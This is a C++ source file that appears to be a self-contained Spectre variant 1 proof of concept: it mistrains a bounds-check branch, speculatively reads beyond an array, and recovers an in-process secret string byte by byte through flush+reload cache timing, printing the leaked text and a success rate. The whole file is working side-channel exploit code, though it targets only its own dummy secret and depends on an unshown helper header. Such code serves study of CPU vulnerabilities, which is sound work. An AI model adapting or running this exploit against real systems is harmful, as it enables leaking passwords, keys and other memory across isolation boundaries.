#include <time.h>
#include <stdio.h>
#include <stdint.h>
#include <memory.h>
#include <random>
#include "utils.hpp"

#define FROM ' '
#define TO 'Z'

const int TRAINING_LOOPS = 100;
bool IS_ATTACK[TRAINING_LOOPS];
uint8_t arr[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18};
uint8_t hist[256];
uint8_t arr_size = sizeof(arr) / sizeof(uint8_t);
char secret[] = "AD ASTRA ABYSSOSQUE";
char __attribute__((aligned(2048))) mem_side_channel[256 * 2048];

using namespace x86_64;

void init()
{
    for (int i = 0; i < TRAINING_LOOPS; i++)
    {
        if ((double)rand() / RAND_MAX > 0.5)
        {
            IS_ATTACK[i] = true;
        }
    }
    printf("Mistrain(0) and Attack(1) Mark: \n");
    for (int i = 0; i < TRAINING_LOOPS; i++)
    {
        printf("%d ", IS_ATTACK[i]);
    }
    printf("\n\n");
}

size_t get_side_channel_info(bool show = true)
{
    if (show)
    {
        printf("  ");
        for (size_t i = FROM; i <= TO; i++)
        {
            printf("%3c ", (char)i);
        }
        printf("\n  ");
    }
    uint8_t max = 0, argmax = FROM, all = 0;
    for (size_t i = FROM; i <= TO; i++)
    {
        if (show)
        {
            printf("%3ld ", i);
        }
        argmax = max > hist[i] ? argmax : i;
        max = max > hist[i] ? max : hist[i];
        all += hist[i];
    }
    if (show)
    {
        printf("\n%% ");
        for (size_t i = FROM; i <= TO; i++)
        {
            printf("%3.0f ", (double)hist[i] / ((double)all + 1e-8) * 100);
        }
        printf("\nargmax: %c\n", argmax);
    }
    return argmax;
}

uint8_t spectre(size_t locate)
{
    // return mem_side_channel[arr[locate] * 2048];
    if (locate < arr_size)
    {
        return mem_side_channel[arr[locate] * 2048];
    }
    return 0;
}

void attack(size_t target)
{
    // initializing the side-channel
    asm_utils::flush(&arr_size);
    for (int i = 0; i < 256; i++)
    {
        asm_utils::flush(&mem_side_channel[i * 2048]);
    }

    // branch mistraining
    for (int i = TRAINING_LOOPS - 1; i >= 0; i--)
    {
        asm_utils::flush(&arr_size);
        spectre(0);
    }

    // spectre attack
    spectre(target);

    // recovering the secret
    for (int i = FROM; i <= TO; i++)
    {
        if (asm_utils::flush_reload((char *)mem_side_channel + 2048 * i))
        {
            hist[i]++;
        }
    }
}

size_t run(size_t locate)
{
    memset(hist, 0, sizeof(hist));
    memset(mem_side_channel, 0, sizeof(mem_side_channel));
    for (size_t i = 0; i < sizeof(mem_side_channel); i++)
    {
        asm_utils::maccess(mem_side_channel + i);
    }
    for (int i = 0; i < 10; i++)
    {
        attack(locate);
    }
    size_t result = get_side_channel_info(false);
    return result;
}

int main(int argc, char **argv)
{
    size_t target_base = (size_t)(&secret) - (size_t)(&arr);

    if (false)
    {
        printf("v: %c %u\n", *secret, *arr);
        printf("a: %ld %ld\n", (size_t)&secret, (size_t)&arr);
        printf("a(size_t): %ld %ld\n", (size_t)&secret, (size_t)&arr);
        printf("diff: %ld\n", target_base);
        printf("%hhu\n", *(char *)((size_t)(&arr) + target_base));
        printf("%ld\n", (size_t)&arr[20]);
        printf("%ld\n", sizeof(uint8_t));
        printf("%ld\n", sizeof(char));
        printf("%c\n", arr[target_base]);
    }
    size_t leak[arr_size + 1], len = sizeof(secret) / sizeof(char), success = 0;
    for (size_t i = 0; i < len - 1; i++)
    {
        size_t result = run(target_base + i);
        leak[i] = result;
        success += secret[i] == (char)result;
    }
    printf("%s, gt\n", secret);
    for (size_t i = 0; i < len - 1; i++)
    {
        printf("%c", (char)leak[i]);
    }
    printf(", success rate: %.3lf%%\n", (double)success / (len - 1) * 100);
    return 0;
}
